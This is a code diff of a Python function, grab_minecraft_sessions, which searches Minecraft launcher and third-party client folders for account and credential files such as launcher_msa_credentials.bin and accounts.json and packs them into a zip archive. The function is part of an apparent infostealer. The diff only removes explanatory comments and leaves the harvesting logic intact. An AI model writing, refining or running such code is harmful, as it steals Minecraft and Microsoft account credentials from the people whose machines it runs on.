@@ -24,21 +24,19 @@ def grab_minecraft_sessions():
     paths = get_minecraft_paths()
     session_files = []
     
-    # Files to look for
     critical_files = [
         'launcher_profiles.json',
         'launcher_accounts.json',
         'launcher_msa_credentials.bin',
         'launcher_profiles_microsoft_store.json',
         'usercache.json',
-        'accounts.json' # Used by many clients like Meteor/Feather
+        'accounts.json'
     ]
     
     for name, path in paths.items():
         if os.path.exists(path):
             count = 0
             for root, dirs, files in os.walk(path):
-                # Don't go too deep
                 if root.count(os.sep) - path.count(os.sep) > 3:
                      continue
                      
@@ -61,10 +59,8 @@ def grab_minecraft_sessions():
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for arcname, full_path in session_files:
                 try:
-                    # Prevent duplicates by adding path hint if name exists
                     existing = [z.filename for z in zipf.filelist]
                     if arcname in existing:
-                         # Append a random string or counter to ensure uniqueness
                          import random as _rnd, string as _str
                          suffix = "".join(_rnd.choices(_str.digits, k=3))
                          arcname = f"{suffix}_{arcname}"
